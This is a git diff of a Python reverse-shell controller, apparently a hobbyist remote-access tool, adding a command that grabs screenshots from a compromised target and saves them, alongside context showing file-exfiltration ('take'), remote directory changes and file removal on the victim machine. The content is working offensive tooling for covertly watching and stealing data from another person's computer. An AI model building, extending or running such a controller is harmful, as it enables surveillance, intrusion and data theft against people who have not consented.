@@ -9,7 +9,7 @@ import os
 import json
 # The process of encoding JSON is usually called serialization. This term refers to the transformation of data into a series of bytes (hence serial) to be stored or transmitted across a network.
 
-import pyfiglet # python module used to produce ASCII art fonts
+import pyfiglet # python library to print ASCII art fonts
 
 # Sending whole data all at once
 def send_eff(data):
@@ -83,11 +83,11 @@ def banner():
 	print("\r")
 
 	print(colored("Created by @soumyani1", 'blue'))
-
+	
 	print("\n")
 
 	print(colored("~> Please feel free to reach me for some suggestions:",'yellow'))
-
+	
 	print(colored('''
 ⚪ https://www.linkedin.com/in/soumyanil-biswas/
 ⚪ https://twitter.com/soumyani1
@@ -216,12 +216,13 @@ You can also use other commands related to networking, etc for linux as well as 
 			continue # we know that after changing direc nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt
 
 
-		# clearing screen in windows/linux ✓
+		# clearing screen in windows/linux  ✓
 		elif (cmd[:3] == "cls" and len(cmd) > 1) or (cmd[:5] == 'clear' and len(cmd) > 1):
 
 			def screen_clear():
 				os.system('cls' if os.name=='nt' else 'clear')
 			screen_clear()
+
 
 		# Changing directory  ✓
 		elif cmd[:2] == "cd" and len(cmd) > 1:
@@ -231,6 +232,7 @@ You can also use other commands related to networking, etc for linux as well as 
 
 		# Removing file path in linux  ✓
 		elif cmd[:2] == "rm" and len(cmd) > 1:
+
 			continue # we know that after removing path nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt
 
 
@@ -239,6 +241,42 @@ You can also use other commands related to networking, etc for linux as well as 
 
 			continue # we know that after removing path nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt
 
+
+		# Screenshot
+
+		# screenshot function is same as download as after all we would only 
+		# download the captured image from trgt as rev_shell gonna take the ss
+		elif (cmd[:10 ] == "screenshot" and len(cmd) > 1 ) or (cmd[:2] == 'ss' and len(cmd) > 1 ):
+
+			file = open(f"screenshot{counter}.png", 'wb')
+
+			trgt.settimeout(5) # taking 5 second for maximum as taking screenshot via 					    # rev_shell and downloading it can take time.
+
+		        # if all file datas are sent and nothing left for download,
+        		# the socket will keep on listening, but will not receive
+		        # anything, so if now it hangs(keeps on listening) for 1 sec,
+		        # while loop will break --> indicating file data transfer is
+		        # complete.
+
+			print(colored("[+] Capturing screenshot ... ", 'green'))
+
+			data_small = trgt.recv(1024)
+
+			while data_small:
+
+				file.write(data_small)
+
+				try:
+
+					data_small = trgt.recv(1024)
+
+				except socket.timeout:
+
+					break
+
+			trgt.settimeout(None)
+			file.close()
+			counter += 1
 
 		# Exfiltration in trgt point of view  ✓
 		elif cmd[:4] == "take" and len(cmd) > 1:
